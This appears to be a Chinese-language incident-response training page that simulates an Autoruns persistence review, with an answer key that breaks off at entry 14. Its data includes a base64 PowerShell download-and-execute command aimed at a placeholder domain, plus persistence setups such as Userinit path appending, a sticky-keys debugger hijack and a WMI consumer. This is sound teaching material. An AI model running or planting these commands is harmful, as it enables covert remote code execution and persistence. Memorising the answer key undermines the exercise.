@@ -1,0 +1,643 @@
+<!DOCTYPE html>
+<html lang="zh-Hant">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Autoruns 鑑識實驗 — 持久化機制清查</title>
+<style>
+  :root{
+    --face:#ECE9E1;
+    --face-hi:#FFFFFF;
+    --face-lo:#9A958A;
+    --face-lo2:#6E6A61;
+    --pane:#FFFFFF;
+    --select:#10306B;
+    --ink:#1B1A17;
+    --ink-soft:#5A554B;
+    --tag-flag:#8C1D18;
+    --tag-clear:#1F5D3F;
+    --ar-pink:#FFC9C9;   /* 無簽章／無描述 */
+    --ar-yellow:#FFF6A8; /* 檔案已不存在 */
+    --ar-grp:#E4E1D8;    /* 群組標題列 */
+    --ui:Tahoma,Verdana,"Noto Sans TC","PingFang TC","Microsoft JhengHei",sans-serif;
+    --mono:Consolas,"Courier New","Noto Sans Mono CJK TC",monospace;
+    --doc:Georgia,"Songti TC","Noto Serif TC",serif;
+  }
+  *{box-sizing:border-box}
+  body{
+    margin:0;padding:18px;background:#7A8393;
+    background-image:linear-gradient(180deg,#7A8393,#5E6675);
+    font-family:var(--ui);color:var(--ink);font-size:13px;line-height:1.5;
+  }
+  .wrap{max-width:1100px;margin:0 auto}
+
+  header.evidence{
+    background:var(--tag-flag);color:#F7EFE6;padding:14px 18px;border:2px solid #5D120F;
+    display:flex;flex-wrap:wrap;gap:6px 26px;align-items:baseline;
+  }
+  header.evidence h1{font-family:var(--doc);font-size:17px;font-weight:400;margin:0;letter-spacing:.02em}
+  header.evidence .meta{font-family:var(--mono);font-size:11px;opacity:.85}
+  header.evidence .meta b{font-weight:400;color:#F0C9C0}
+
+  .bevel-out{border-top:2px solid var(--face-hi);border-left:2px solid var(--face-hi);
+             border-right:2px solid var(--face-lo2);border-bottom:2px solid var(--face-lo2)}
+  .bevel-in{border-top:2px solid var(--face-lo2);border-left:2px solid var(--face-lo2);
+            border-right:2px solid var(--face-hi);border-bottom:2px solid var(--face-hi)}
+
+  .shell{background:var(--face);padding:3px;margin-top:14px}
+  .titlebar{background:linear-gradient(90deg,var(--select),#3B5C9E);color:#fff;
+            padding:3px 6px;font-size:12px;display:flex;justify-content:space-between;align-items:center}
+  .titlebar .btns{font-family:var(--mono);letter-spacing:2px;opacity:.9}
+  .menubar{padding:3px 6px;font-size:12px;color:var(--ink-soft);border-bottom:1px solid var(--face-lo)}
+  .menubar span{margin-right:15px}
+  .menubar u{text-decoration:underline}
+
+  .optbar{padding:5px 7px;display:flex;flex-wrap:wrap;gap:5px 18px;align-items:center;
+          border-bottom:1px solid var(--face-lo);font-size:12px}
+  .chk{display:inline-flex;align-items:center;gap:5px;cursor:pointer;user-select:none}
+  .chk .box{width:13px;height:13px;background:var(--pane);display:inline-block;
+            border-top:1px solid var(--face-lo2);border-left:1px solid var(--face-lo2);
+            border-right:1px solid var(--face-hi);border-bottom:1px solid var(--face-hi);
+            font-family:var(--mono);font-size:11px;line-height:11px;text-align:center;color:#123}
+  .chk.on .box::after{content:"\2713"}
+
+  .tabs{display:flex;flex-wrap:wrap;gap:2px;padding:5px 5px 0}
+  .tab{font-size:11.5px;padding:3px 11px;background:#DEDACF;color:var(--ink-soft);cursor:pointer;
+       border-top:1px solid var(--face-hi);border-left:1px solid var(--face-hi);
+       border-right:1px solid var(--face-lo2)}
+  .tab.on{background:var(--face);color:var(--ink);position:relative;top:1px;padding-bottom:4px}
+
+  .listwrap{background:var(--pane);margin:0 3px;overflow-x:auto}
+  table.ar{border-collapse:collapse;width:100%;font-size:12px;white-space:nowrap;min-width:960px}
+  table.ar th{
+    background:linear-gradient(180deg,#FDFDFC,#E7E4DC);font-weight:400;text-align:left;
+    padding:4px 8px;border-right:1px solid #C9C5BB;border-bottom:1px solid #C9C5BB;
+    position:sticky;top:0;z-index:2;font-size:11.5px;
+  }
+  table.ar td{padding:2px 8px;border-bottom:1px solid #F2F1EC}
+  table.ar tr.grp td{background:var(--ar-grp);font-family:var(--mono);font-size:11.5px;color:#3A362E}
+  table.ar tr.row{cursor:pointer}
+  table.ar tr.pink td{background:var(--ar-pink)}
+  table.ar tr.yellow td{background:var(--ar-yellow)}
+  table.ar tr.row:hover td{filter:brightness(.95)}
+  table.ar tr.row.sel td{background:var(--select);color:#fff;filter:none}
+  .mono{font-family:var(--mono);font-size:11.5px}
+  .blank{color:#9A958A}
+  tr.sel .blank{color:#B9C6E3}
+  .ck{display:inline-block;width:13px;color:var(--ink-soft)}
+  tr.sel .ck{color:#B9C6E3}
+  .tag{display:inline-block;font-size:10px;padding:0 5px;border-radius:1px;color:#fff;
+       font-family:var(--ui);vertical-align:1px}
+  .tag.f{background:#B32E27}
+  .tag.c{background:#2E7A55}
+
+  .legend{display:flex;flex-wrap:wrap;gap:4px 16px;padding:6px 8px;font-size:11px;color:var(--ink-soft)}
+  .legend i{display:inline-block;width:22px;height:10px;margin-right:5px;border:1px solid #B7B2A7;vertical-align:-1px}
+
+  .toolbar{padding:6px;display:flex;flex-wrap:wrap;gap:6px;align-items:center;border-top:1px solid var(--face-lo)}
+  button{
+    font-family:var(--ui);font-size:12px;padding:4px 12px;background:var(--face);
+    border-top:2px solid var(--face-hi);border-left:2px solid var(--face-hi);
+    border-right:2px solid var(--face-lo2);border-bottom:2px solid var(--face-lo2);
+    cursor:pointer;color:var(--ink);
+  }
+  button:active{border-top-color:var(--face-lo2);border-left-color:var(--face-lo2);
+                border-right-color:var(--face-hi);border-bottom-color:var(--face-hi)}
+  button:focus-visible{outline:2px dotted var(--ink);outline-offset:-6px}
+  button[disabled]{color:var(--face-lo);cursor:default}
+  button.flag{background:#F3DEDC}
+  button.clear{background:#DDEAE1}
+  .spacer{flex:1}
+  .hint{font-size:11px;color:var(--ink-soft)}
+  .statusbar{font-family:var(--mono);font-size:11px;color:var(--ink-soft);padding:4px 8px;
+             border-top:1px solid var(--face-lo)}
+
+  .modal-bg{position:fixed;inset:0;background:rgba(20,22,28,.45);display:none;
+            align-items:center;justify-content:center;padding:16px;z-index:20}
+  .modal-bg.open{display:flex}
+  .dlg{background:var(--face);padding:3px;width:min(720px,100%);max-height:90vh;overflow:auto}
+  .dlg-body{padding:12px 14px}
+  .kv{display:grid;grid-template-columns:118px 1fr;gap:3px 10px;font-size:12px;
+      background:var(--pane);padding:9px 11px}
+  .kv .k{color:var(--ink-soft)}
+  .kv .v{font-family:var(--mono);font-size:11.5px;word-break:break-all;white-space:pre-wrap}
+  .warn{color:#8C1D18}
+  .okc{color:#1F5D3F}
+  .out{background:#F4F7F2;border-left:3px solid var(--tag-clear);padding:6px 9px;
+       font-family:var(--mono);font-size:11.5px;margin-top:8px;word-break:break-all;display:none}
+  .out.show{display:block}
+  .out.bad{background:#FBF0EF;border-left-color:var(--tag-flag)}
+
+  .report{background:#FBFAF6;margin-top:14px;padding:16px 20px;font-family:var(--doc);font-size:13.5px;line-height:1.65}
+  .report h2{font-size:15px;font-weight:400;margin:0 0 8px;letter-spacing:.03em;
+             border-bottom:1px solid var(--face-lo);padding-bottom:5px}
+  .report h2.again{margin-top:16px}
+  .report p{margin:0 0 9px}
+  .report ol,.report ul{margin:0;padding-left:20px}
+  .report li{margin-bottom:6px}
+  .report code{font-family:var(--mono);font-size:12px;background:var(--face);padding:0 3px}
+  table.sig{border-collapse:collapse;width:100%;font-size:12px;margin-top:4px}
+  table.sig th{text-align:left;font-weight:400;background:var(--face);padding:3px 7px;border:1px solid var(--face-lo)}
+  table.sig td{padding:3px 7px;border:1px solid #E4E1D8;vertical-align:top}
+  .score{font-family:var(--mono);font-size:12px;background:var(--face);padding:9px 12px;margin-top:10px;white-space:pre-wrap}
+  .verdict{display:none;margin-top:12px;border-top:1px dashed var(--face-lo);padding-top:12px}
+  .verdict.show{display:block}
+  .vrow{display:flex;gap:9px;padding:4px 0;border-bottom:1px solid #EFEDE6;align-items:baseline}
+  .vrow .vk{font-family:var(--mono);font-size:12px;min-width:34px}
+  .vrow .vv{font-size:12.5px}
+  .vrow.ok .vk{color:var(--tag-clear)}
+  .vrow.no .vk{color:var(--tag-flag)}
+
+  footer{color:#DDE1E8;font-size:11px;margin-top:14px;text-align:center;line-height:1.7}
+  footer b{color:#fff;font-weight:400}
+
+  @media (max-width:760px){
+    body{padding:8px}
+    .kv{grid-template-columns:1fr}
+    .kv .k{margin-top:5px}
+  }
+  @media (prefers-reduced-motion:reduce){*{animation:none!important;transition:none!important}}
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <header class="evidence">
+    <h1>證物 EV-2026-0422-09 — 自動啟動項目清查（承接 EV-2026-0422-07）</h1>
+    <div class="meta">
+      主機 <b>WKS-TPE-0932</b>・使用者 <b>CORP\j.chen</b>・
+      工具 <b>Autoruns v14.11</b>・掃描 <b>2026-04-22 13:20 (UTC+8)</b>
+    </div>
+  </header>
+
+  <div class="shell bevel-out">
+    <div class="titlebar">
+      <span>Autoruns - Sysinternals: www.sysinternals.com  [CORP\j.chen]</span>
+      <span class="btns">_ □ ×</span>
+    </div>
+    <div class="menubar">
+      <span><u>F</u>ile</span><span><u>E</u>ntry</span><span><u>O</u>ptions</span>
+      <span><u>C</u>ategory</span><span><u>H</u>elp</span>
+    </div>
+    <div class="optbar">
+      <span class="chk on" id="chkMS"><span class="box"></span>Hide Microsoft entries</span>
+      <span class="chk" id="chkEmpty"><span class="box"></span>Hide empty locations</span>
+      <span class="hint" id="cnt"></span>
+    </div>
+
+    <div class="tabs" id="tabs">
+      <span class="tab on" data-c="all">Everything</span>
+      <span class="tab" data-c="logon">Logon</span>
+      <span class="tab" data-c="tasks">Scheduled Tasks</span>
+      <span class="tab" data-c="services">Services</span>
+      <span class="tab" data-c="hijacks">Image Hijacks</span>
+      <span class="tab" data-c="wmi">WMI</span>
+    </div>
+
+    <div class="listwrap bevel-in">
+      <table class="ar">
+        <thead><tr>
+          <th style="width:210px">Autorun Entry</th>
+          <th style="width:210px">Description</th>
+          <th style="width:170px">Publisher</th>
+          <th>Image Path</th>
+          <th style="width:130px">Timestamp</th>
+          <th style="width:52px"></th>
+        </tr></thead>
+        <tbody id="rows"></tbody>
+      </table>
+    </div>
+
+    <div class="legend">
+      <span><i style="background:var(--ar-pink)"></i>粉紅：無簽章或無描述</span>
+      <span><i style="background:var(--ar-yellow)"></i>黃色：檔案已不存在</span>
+      <span><i style="background:var(--pane)"></i>白色：有簽章且有描述</span>
+    </div>
+
+    <div class="toolbar">
+      <button id="btnSort">依 Timestamp 排序</button>
+      <button id="btnOpen" disabled>Entry Properties</button>
+      <span class="spacer"></span>
+      <button id="btnFlag" class="flag" disabled>標記為可疑</button>
+      <button id="btnClear" class="clear" disabled>標記為正常</button>
+      <button id="btnCheck">檢查作答</button>
+    </div>
+    <div class="toolbar" style="border-top:0;padding-top:0">
+      <span class="hint" id="hint">Autoruns 預設勾選 Hide Microsoft entries。開始判讀之前，先想一想這個預設值會讓你看不到什麼。</span>
+    </div>
+    <div class="statusbar" id="status"></div>
+  </div>
+
+  <div class="report">
+    <h2>案情</h2>
+    <p>接續上午那台被巨集文件打進來的財會部主機。EDR 告警後，你已經用 System Informer 看過行程樹，確認執行鏈是
+      <code>OUTLOOK → WINWORD → powershell → 假 svchost → rundll32</code>，另有兩個被拉出樹外的分支。</p>
+    <p>但行程只要重開機就沒了。攻擊者要維持存取，就必須在某個「開機或登入時會被自動執行」的地方留下入口——這就是<strong>持久化（persistence）</strong>。你現在用 Autoruns 掃這台主機，要回答的問題只有一個：<em>重開機之後，這台電腦還會不會自己把惡意程式叫回來？</em></p>
+
+    <h2 class="again">判斷持久化項目的五個常見警訊</h2>
+    <table class="sig">
+      <thead><tr><th style="width:170px">警訊</th><th>說明</th></tr></thead>
+      <tbody>
+        <tr><td>沒有數位簽章</td><td>正常軟體大多有廠商簽章；Publisher 空白或驗證失敗就要小心</td></tr>
+        <tr><td>路徑很奇怪</td><td>藏在 <code>%TEMP%</code>、<code>%APPDATA%</code>、<code>C:\Users\Public</code>、<code>C:\ProgramData</code></td></tr>
+        <tr><td>檔名像亂數</td><td>如 <code>a8f3kx2.exe</code>，或假冒系統程式名稱（<code>svchost32.exe</code>）</td></tr>
+        <tr><td>沒有描述、沒有公司名稱</td><td>Description、Publisher 欄位空白</td></tr>
+        <tr><td>Autoruns 標色提醒</td><td>粉紅＝無簽章或無描述；黃色＝檔案已不存在</td></tr>
+      </tbody>
+    </table>
+    <p style="margin-top:9px">符合越多項，越值得深入調查。但這五項是<strong>篩選器，不是判決書</strong>——本實驗刻意安排了「五項都不符合卻是惡意」與「符合兩三項卻完全正常」的項目。清查完之後，請回頭檢討這五項各自在哪裡失效。</p>
+
+    <h2 class="again">你的任務</h2>
+    <ol>
+      <li>逐項判讀 22 個自動啟動項目，標記「可疑」或「正常」。</li>
+      <li>先在預設狀態（Hide Microsoft entries 勾選）下數一次你找到幾個。取消勾選再數一次。差幾個？為什麼會差？</li>
+      <li>有三個項目符合上表的警訊，卻是正常的。分別說明它們為什麼正常。</li>
+      <li>用「依 Timestamp 排序」找出寫入時間集中的區段。注意：登錄檔的 Run 機碼底下所有項目<em>共用同一個機碼的最後寫入時間</em>，所以時間只能告訴你「這個機碼被動過」，不能告訴你「是哪一個值被動的」。說明這個限制對你的判斷有什麼影響。</li>
+      <li>把找到的持久化項目與上午行程樹裡的檔案對應起來，指出哪些是同一批檔案。</li>
+      <li>假設你只能先移除一個項目，你選哪一個？為什麼？移除之後這台機器就乾淨了嗎？</li>
+    </ol>
+    <div class="score" id="score">已標記 0 / 22　　可疑 0　　正常 0</div>
+    <div class="verdict" id="verdict"></div>
+  </div>
+
+  <footer>
+    <b>合成資料，僅供教學。</b>主機名稱、帳號、時間、檔名與登錄檔內容均為虛構；
+    網域取自 RFC 2606 保留名稱。此頁面不含任何可執行的持久化程式碼，不執行任何命令，也不會對外發出請求。
+  </footer>
+</div>
+
+<div class="modal-bg" id="modal" role="dialog" aria-modal="true" aria-labelledby="dlgTitle">
+  <div class="dlg bevel-out">
+    <div class="titlebar">
+      <span id="dlgTitle">Entry Properties</span>
+      <span class="btns"><button id="btnX" style="padding:0 7px;font-size:11px">×</button></span>
+    </div>
+    <div class="dlg-body">
+      <div class="kv bevel-in" id="kv"></div>
+      <div class="toolbar" style="padding-left:0;border-top:0">
+        <button id="btnVerify">Verify（驗證數位簽章）</button>
+        <button id="btnDec">Decode -EncodedCommand</button>
+      </div>
+      <div class="out" id="outV"></div>
+      <div class="out" id="outD"></div>
+    </div>
+  </div>
+</div>
+
+<script>
+(function(){
+  "use strict";
+
+  var B64 = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0"
+          + "ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGkA"
+          + "bAAtAHYAZQByAGkAZgB5AC4AZQB4AGEAbQBwAGwAZQAuAG4AZQB0AC8AcAAuAHAAcwAxACcAKQA=";
+
+  var MS = "Microsoft Windows", MSC = "Microsoft Corporation";
+  var G1 = "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+      G2 = "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+      G3 = "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
+      G4 = "C:\\Users\\j.chen\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
+      G5 = "Task Scheduler",
+      G6 = "HKLM\\SYSTEM\\CurrentControlSet\\Services",
+      G7 = "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options",
+      G8 = "root\\subscription (WMI)";
+
+  /* ms:true = 簽章者為 Microsoft，勾選 Hide Microsoft entries 時會被隱藏 */
+  var E = [
+    {n:"01",cat:"logon",grp:G1,gts:"2026-03-02 09:14:22",name:"OneDrive",desc:"Microsoft OneDrive",pub:MSC,ms:1,
+     img:"C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe /background",
+     val:"\"C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe\" /background",
+     sig:"已驗證：Microsoft Corporation",size:"2,148 KB",fts:"2026-02-18 04:11:02"},
+
+    {n:"02",cat:"logon",grp:G1,gts:"2026-03-02 09:14:22",name:"SecurityHealth",desc:"Windows Security notification icon",pub:MS,ms:1,
+     img:"C:\\Windows\\System32\\SecurityHealthSystray.exe",
+     val:"%windir%\\system32\\SecurityHealthSystray.exe",
+     sig:"已驗證：Microsoft Windows",size:"112 KB",fts:"2026-03-02 09:14:20"},
+
+    {n:"03",cat:"logon",grp:G1,gts:"2026-03-02 09:14:22",name:"RtkAudUService",desc:"Realtek HD Audio Universal Service",pub:"Realtek Semiconductor Corp.",
+     img:"C:\\Program Files\\Realtek\\Audio\\RtkAudUService64.exe",
+     val:"\"C:\\Program Files\\Realtek\\Audio\\RtkAudUService64.exe\" -background",
+     sig:"已驗證：Realtek Semiconductor Corp.",size:"1,024 KB",fts:"2025-09-30 11:22:41"},
+
+    {n:"04",cat:"logon",grp:G1,gts:"2026-03-02 09:14:22",name:"CorpVPNAgent",desc:"",pub:"",cls:"pink",
+     img:"C:\\Corp\\Tools\\vpnagent.exe",
+     val:"C:\\Corp\\Tools\\vpnagent.exe -silent",
+     sig:"※ 未簽署",size:"768 KB",fts:"2025-06-11 09:03:55"},
+
+    {n:"05",cat:"logon",grp:G2,gts:"2026-04-22 10:42:19",name:"Zoom",desc:"Zoom Meetings",pub:"Zoom Video Communications, Inc.",
+     img:"C:\\Users\\j.chen\\AppData\\Roaming\\Zoom\\bin\\Zoom.exe",
+     val:"\"C:\\Users\\j.chen\\AppData\\Roaming\\Zoom\\bin\\Zoom.exe\" --silent",
+     sig:"已驗證：Zoom Video Communications, Inc.",size:"6,412 KB",fts:"2026-04-09 15:40:12"},
+
+    {n:"06",cat:"logon",grp:G2,gts:"2026-04-22 10:42:19",name:"AdobeGCInvoker-1.0",desc:"File not found: C:\\Program Files\\Common Files\\Adobe\\AdobeGCClient\\AGCInvokerUtility.exe",pub:"",cls:"yellow",
+     img:"C:\\Program Files\\Common Files\\Adobe\\AdobeGCClient\\AGCInvokerUtility.exe",
+     val:"\"C:\\Program Files\\Common Files\\Adobe\\AdobeGCClient\\AGCInvokerUtility.exe\"",
+     sig:"（檔案不存在，無法驗證）",size:"—",fts:"—"},
+
+    {n:"07",cat:"logon",grp:G2,gts:"2026-04-22 10:42:19",name:"a8f3kx2",desc:"",pub:"",cls:"pink",bad:1,
+     img:"C:\\Users\\j.chen\\AppData\\Roaming\\a8f3kx2.exe",
+     val:"C:\\Users\\j.chen\\AppData\\Roaming\\a8f3kx2.exe",
+     sig:"※ 未簽署",size:"284 KB",fts:"2026-04-22 10:42:11"},
+
+    {n:"08",cat:"logon",grp:G2,gts:"2026-04-22 10:42:19",name:"OneDrive Update",desc:"Windows host process (Rundll32)",pub:MS,ms:1,bad:1,
+     img:"C:\\Windows\\System32\\rundll32.exe C:\\Users\\j.chen\\AppData\\Local\\Temp\\vfy32.dll,Start",
+     val:"rundll32.exe C:\\Users\\j.chen\\AppData\\Local\\Temp\\vfy32.dll,Start",
+     sig:"已驗證：Microsoft Windows",size:"71 KB",fts:"2026-03-02 09:14:20",
+     extra:"rundll32.exe 本身是有效簽章的系統程式；它載入的 vfy32.dll 建立於 2026-04-22 10:42:04，未簽署。"},
+
+    {n:"09",cat:"logon",grp:G3,gts:"2026-04-22 10:43:07",name:"Userinit",desc:"Userinit Logon Application",pub:MS,ms:1,bad:1,
+     img:"C:\\Windows\\system32\\userinit.exe",
+     val:"C:\\Windows\\system32\\userinit.exe,C:\\Users\\Public\\wupd.exe,",
+     sig:"已驗證：Microsoft Windows",size:"52 KB",fts:"2026-03-02 09:14:20",
+     extra:"Autoruns 的 Description 與 Publisher 欄位解析的是值裡的第一個路徑。原廠預設值為 C:\\Windows\\system32\\userinit.exe, （只有一項）。C:\\Users\\Public\\wupd.exe 建立於 2026-04-22 10:43:01，未簽署。"},
+
+    {n:"10",cat:"logon",grp:G3,gts:"2026-04-22 10:43:07",name:"Shell",desc:"Windows Explorer",pub:MS,ms:1,
+     img:"C:\\Windows\\explorer.exe",val:"explorer.exe",
+     sig:"已驗證：Microsoft Windows",size:"4,830 KB",fts:"2026-03-02 09:14:20"},
+
+    {n:"11",cat:"logon",grp:G4,gts:"2026-01-20 08:55:03",name:"Microsoft Teams.lnk",desc:"Microsoft Teams",pub:MSC,ms:1,
+     img:"C:\\Program Files\\WindowsApps\\MSTeams_25.1.0\\ms-teams.exe",
+     val:"（捷徑）--processStart",
+     sig:"已驗證：Microsoft Corporation",size:"12,480 KB",fts:"2026-01-20 08:54:59"},
+
+    {n:"12",cat:"tasks",grp:G5,gts:"2026-01-15 21:02:44",name:"\\GoogleUpdateTaskMachineUA",desc:"Google Installer",pub:"Google LLC",
+     img:"C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe /ua /installsource scheduler",
+     val:"觸發程序：每日 21:00、登入後 5 分鐘",
+     sig:"已驗證：Google LLC",size:"1,562 KB",fts:"2026-01-15 21:02:40"},
+
+    {n:"13",cat:"tasks",grp:G5,gts:"2026-03-02 09:16:10",name:"\\Microsoft\\Windows\\UpdateOrchestrator\\Schedule Scan",desc:"Windows Update",pub:MS,ms:1,
+     img:"C:\\Windows\\System32\\usoclient.exe StartScan",
+     val:"觸發程序：每日 03:00（隨機延遲 4 小時）",
+     sig:"已驗證：Microsoft Windows",size:"1,204 KB",fts:"2026-03-02 09:14:20"},
+
+    {n:"14",cat:"tasks",grp:G5,gts:"2026-04-22 10:45:11",name:"\\Microsoft\\Windows\\Maintenance\\SystemUpdateCheck",desc:"Windows PowerShell",pub:MS,ms:1,bad:1,
+     img:"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -w hidden -ep bypass -enc " + B64,
+     val:"觸發程序：使用者登入時、以及每 30 分鐘重複一次",
+     sig:"已驗證：Microsoft Windows",size:"447 KB",fts:"2026-03-02 09:14:20",
+     extra:"工作建立者：CORP\\j.chen。同層資料夾 \\Microsoft\\Windows\\Maintenance 底下的原廠工作只有 WinSAT 一項。"},
+
+    {n:"15",cat:"tasks",grp:G5,gts:"2025-11-04 17:30:08",name:"\\CorpBackupNightly",desc:"",pub:"",cls:"pink",
+     img:"C:\\Windows\\System32\\cmd.exe /c C:\\Corp\\Tools\\backup.cmd",
+     val:"觸發程序：每日 22:30",
+     sig:"※ 指令碼未簽署",size:"—",fts:"2025-11-04 17:29:51",
+     extra:"工作建立者：CORP\\it.admin"},
+
+    {n:"16",cat:"services",grp:G6,gts:"2026-01-08 10:12:33",name:"NetMonAgent",desc:"NetMon Endpoint Agent",pub:"NetMon Systems Inc.",
+     img:"C:\\Program Files\\NetMon\\MonAgent.exe",
+     val:"啟動類型：自動　服務帳戶：LocalSystem",
+     sig:"已驗證：NetMon Systems Inc.",size:"8,940 KB",fts:"2026-01-08 10:12:29"},
+
+    {n:"17",cat:"services",grp:G6,gts:"2026-03-02 09:14:22",name:"WinDefend",desc:"Antimalware Service Executable",pub:MS,ms:1,
+     img:"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.26030.1-0\\MsMpEng.exe",
+     val:"啟動類型：自動　服務帳戶：LocalSystem",
+     sig:"已驗證：Microsoft Windows",size:"142,208 KB",fts:"2026-03-02 09:14:18"},
+
+    {n:"18",cat:"services",grp:G6,gts:"2026-04-22 10:47:33",name:"WindowsUpdateSvc",desc:"",pub:"",cls:"pink",bad:1,
+     img:"C:\\Users\\j.chen\\AppData\\Local\\Temp\\taskhostw.exe",
+     val:"啟動類型：自動　服務帳戶：LocalSystem",
+     sig:"※ 未簽署",size:"196 KB",fts:"2026-04-22 10:47:28",
+     extra:"Windows 原廠的更新服務名稱為 wuauserv，顯示名稱為 Windows Update。系統中不存在名為 WindowsUpdateSvc 的原廠服務。"},
+
+    {n:"19",cat:"services",grp:G6,gts:"2026-03-02 09:14:22",name:"Spooler",desc:"Print Spooler",pub:MS,ms:1,
+     img:"C:\\Windows\\System32\\spoolsv.exe",
+     val:"啟動類型：自動　服務帳戶：LocalSystem",
+     sig:"已驗證：Microsoft Windows",size:"812 KB",fts:"2026-03-02 09:14:20"},
+
+    {n:"20",cat:"hijacks",grp:G7,gts:"2026-04-22 10:46:02",name:"sethc.exe（Debugger）",desc:"Windows Command Processor",pub:MS,ms:1,bad:1,
+     img:"C:\\Windows\\System32\\cmd.exe",
+     val:"Debugger = C:\\Windows\\System32\\cmd.exe",
+     sig:"已驗證：Microsoft Windows",size:"289 KB",fts:"2026-03-02 09:14:20",
+     extra:"sethc.exe 是「相黏鍵」協助工具，在登入畫面連按五次 Shift 即會由系統以 SYSTEM 權限啟動。此機碼底下原本沒有任何項目。"},
+
+    {n:"21",cat:"wmi",grp:G8,gts:"2026-03-02 09:15:41",name:"SCM Event Log Consumer",desc:"WMI Standard Event Consumer - Log",pub:MS,ms:1,
+     img:"C:\\Windows\\System32\\wbem\\scrcons.exe",
+     val:"篩選器：SCM Event Log Filter（服務控制管理員事件）",
+     sig:"已驗證：Microsoft Windows",size:"312 KB",fts:"2026-03-02 09:14:20",
+     extra:"此組篩選器與取用者隨 Windows 一併安裝，存在於所有 Windows 主機。"},
+
+    {n:"22",cat:"wmi",grp:G8,gts:"2026-04-22 10:44:50",name:"SysMaint（CommandLineEventConsumer）",desc:"",pub:"",cls:"pink",bad:1,
+     img:"wscript.exe //B //E:jscript C:\\Users\\j.chen\\AppData\\Local\\Temp\\upd.js",
+     val:"篩選器：SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'",
+     sig:"※ 未簽署",size:"—",fts:"2026-04-22 10:44:46",
+     extra:"WMI 事件訂閱不在登錄檔的一般自啟動位置，儲存於 WMI 儲存庫（OBJECTS.DATA），不會出現在工作管理員或 msconfig 的啟動清單裡。"}
+  ];
+
+  var KEY = {
+    "01":{bad:0,why:"OneDrive 的官方啟動項，簽章有效、路徑在 Program Files。"},
+    "02":{bad:0,why:"Windows 安全性通知圖示，原廠項目。"},
+    "03":{bad:0,why:"音效驅動的常駐服務，有廠商簽章。"},
+    "04":{bad:0,why:"陷阱題（粉紅色）。未簽署、Description 與 Publisher 全空白，五個警訊中了三個 —— 但它是公司自行開發的 VPN 代理程式，路徑在 C:\\Corp\\Tools，建立時間是去年，而且全公司主機都有。內部自製工具沒有預算買程式碼簽章憑證是常態。粉紅色代表「Autoruns 沒辦法幫你背書」，不代表「這是壞的」。判斷方式是拿去跟其他同仁的機器比對，或問資訊處要一份標準基準線。"},
+    "05":{bad:0,why:"陷阱題（路徑在 AppData）。Zoom 這類軟體採用「每使用者安裝」，本來就會裝在 %APPDATA%，這是設計而不是隱藏。簽章有效、發行者明確、檔案建立於兩週前。%APPDATA% 是需要留意的位置，不是有罪的位置。"},
+    "06":{bad:0,why:"陷阱題（黃色）。黃色代表「登錄檔裡還有這一筆，但檔案已經不在了」—— 絕大多數情況是軟體移除後沒清乾淨的殘留。一個檔案不存在的啟動項什麼都執行不了，它是垃圾不是威脅。真正要注意的相反情況是：黃色項目指向的路徑，如果攻擊者有寫入權限，就可能被放上同名檔案而「借屍還魂」。"},
+    "07":{bad:1,why:"五個警訊全中：檔名像亂數、路徑在 %APPDATA% 根目錄、無簽章、無描述、無發行者、Autoruns 標粉紅。檔案建立於 10:42:11，正好在上午那條執行鏈的時間帶內。這是本實驗唯一一個「靠五項篩選就抓得到」的項目 —— 也是最不重要的一個，因為它太明顯了，通常是攻擊者故意留下的替死鬼或最低階的一層。（T1547.001）"},
+    "08":{bad:1,why:"最重要的一題。它<b>五個警訊一個都不符合</b>：Publisher 是 Microsoft Windows、Description 正常、影像路徑在 System32、檔名是系統程式、Autoruns 顯示白色 —— 而且因為簽章者是 Microsoft，預設的 Hide Microsoft entries 會直接把它藏起來。破綻只在完整的值資料裡：rundll32 載入的是 %TEMP% 底下的 vfy32.dll。值名稱取作「OneDrive Update」也是刻意的偽裝。看 Image Path 欄位不夠，一定要看完整參數。（T1547.001 + T1218.011）"},
+    "09":{bad:1,why:"Winlogon 的 Userinit 值被附加了第二個路徑。原廠預設只有 C:\\Windows\\system32\\userinit.exe, 一項；這裡多了 C:\\Users\\Public\\wupd.exe。Autoruns 的 Description 與 Publisher 解析的是值裡的<em>第一個</em>路徑，所以欄位顯示得乾乾淨淨、簽章有效、顏色是白的。這一題的教訓是：欄位是工具幫你摘要過的，摘要一定有損失，關鍵時刻要看原始值。（T1547.004）"},
+    "10":{bad:0,why:"Winlogon 的 Shell 值維持原廠的 explorer.exe，正常。順帶一提，這個值也是常見的竄改目標，要一起看。"},
+    "11":{bad:0,why:"啟動資料夾裡的 Teams 捷徑，簽章有效。啟動資料夾是最容易被忽略的持久化位置之一，因為它不在登錄檔裡 —— 這次沒有異常，但清查時不能跳過。"},
+    "12":{bad:0,why:"Google 更新工作，有效簽章，去年建立。"},
+    "13":{bad:0,why:"Windows Update 的原廠排程工作。"},
+    "14":{bad:1,why:"排程工作，路徑刻意放在 \\Microsoft\\Windows\\Maintenance 底下冒充原廠工作，執行的是有效簽章的 powershell.exe —— 同樣會被 Hide Microsoft entries 藏起來。破綻有三：參數組合（-w hidden 隱藏視窗、-ep bypass 略過執行原則、-enc 編碼命令）、觸發條件（登入時 + 每 30 分鐘重複，原廠維護工作不會這樣設）、以及工作建立者是 j.chen 這個一般使用者。按 Decode 可以解出它連往哪裡。（T1053.005）"},
